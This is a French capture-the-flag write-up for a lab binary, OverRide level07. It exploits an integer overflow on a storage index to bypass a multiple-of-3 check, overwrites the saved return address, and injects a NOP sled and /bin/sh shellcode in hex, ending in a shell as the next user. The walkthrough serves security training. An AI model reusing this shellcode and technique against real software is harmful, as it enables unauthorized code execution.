Un programme qui nous permet de stocker des nombres directement dans la stack.
Nous avons 3 commandes à notre disposition :
- store: nous permet de stocker un INT (4 octet) à un index précis
- read: nous permet de lire le nombre stocké à un index, nous sera utile pour le débuguage
- quit: pour quitter le programme

Néanmoins,le programme ne nous laisse pas store pour les multiples de 3 en l'état (une verification faite avec un %3).
On va essayer d'overflow pour bypass cette vérif.
	*(uint32_t *)(index * 4 + arg_8h) = uVar1;
Notre index est multiplié par 4 (pour respecter les 4 octets/INT). On tenter un index égal a UINT_MAX/4(4294967296/4=1073741824), l'overflow devrait
nous ramener à 0:

	Input command: store
	Number: 42
	Index: 1073741824
	Completed store command successfully
	Input command: read
	Index: 0
	Number at data[0] is 42
	Completed read command successfully

en ajoutant 3 pour écrire à l'index 3 par exemple :
	Input command: store
	Number: 42
	Index: 1073741827
	Completed store command successfully
	Input command: read
	Index: 3
	Number at data[3] is 42
	Completed read command successfully

on peut maintenant écrire ou l'on souhaite.
Il nous faut maintenant trouver EIP, ainsi que l'adresse de notre buffer, pour faire pointer EIP sur ce dernier.

EIP:
On a 4 registres push sur la stack (16octets), avec un stack de taille 0x1d0 (464). Avec l'alignement des 16 octets - les 12 non utilisés, et enfin le start du buffer à esp+0x24(36) = (464+16+12-36)/4 pour avoir l'offset, soit 114.

On va vérifier cette valeur:
	Input command: store
	Number: 42
	Index: 1073741938
	Completed store command successfully
	Input command: quit

	Program received signal SIGSEGV, Segmentation fault.
	0x0000002a in ?? ()

Il ne nous manque plus que le début de notre buffer, pour faire pointer EIP dessus:
	(gdb) b*0x08048795
	Breakpoint 1 at 0x8048795
	(gdb) r
	Starting program: /home/users/level07/level07

	Breakpoint 1, 0x08048795 in main ()
	(gdb) p (void*)$ebx
	$1 = (void *) 0xffffd544
	(gdb)

Sachant que gdb ajoute des variables pendant l'exécution, on va essayer de décaler de 32 octets pour commencer, voir si cela fonctionne, en ajoutant des NOP (\x90) avant notre shellcode
On va donc faire pointer EIP sur 0xffffd544+32 (4294956388)

\x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90
\x31\xc0\xb0\x46 \x31\xdb\x31\xc9 \xcd\x80\xeb\x16 \x5b\x31\xc0\x88
\x43\x07\x89\x5b \x08\x89\x43\x0c \xb0\x0b\x8d\x4b \x08\x8d\x53\x0c
\xcd\x80\xe8\xe5 \xff\xff\xff\x2f \x62\x69\x6e\x2f \x73\x68

On doit maintenant insérer ce shellcode. Pour se faire, on va les prendre par paquet
de 4 octets, qu'on va reverse (pour le little endian), puis convertir en decimal, et
les stocker un par un à partir de l'index 0.

On stock les input dans notre fichier ressoruces/injection, et on le passe en argument du programme:
	level07@OverRide:~$ cat /tmp/exploit7 - | ./level07
	----------------------------------------------------
		Welcome to wil's crappy number storage service!
	----------------------------------------------------
	Commands:
			store - store a number into the data storage
			read  - read a number from the data storage
			quit  - exit the program
	----------------------------------------------------
		wil has reserved some storage :>
	----------------------------------------------------

	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	whoami
	level08
